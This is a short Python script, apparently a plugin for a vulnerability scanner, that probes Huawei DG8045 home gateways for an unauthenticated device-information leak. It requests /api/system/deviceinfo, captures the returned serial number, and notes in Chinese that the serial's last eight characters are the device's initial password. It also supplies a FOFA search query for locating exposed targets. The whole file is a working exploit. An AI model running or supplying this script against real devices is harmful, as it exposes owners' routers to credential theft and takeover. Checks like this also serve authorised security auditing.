#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Huawei DG8045 deviceinfo 信息泄漏',

      'level'     :   'high',

      'FOFA'      :   'app="DG8045-Home-Gateway-DG8045"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/2',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/system/deviceinfo'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'DeviceName.*?SerialNumber.*?Manufacturer',res.text,re.S):
      ret['huixian'] = '\nSerialNumber 后8位即为初始密码\n'+res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret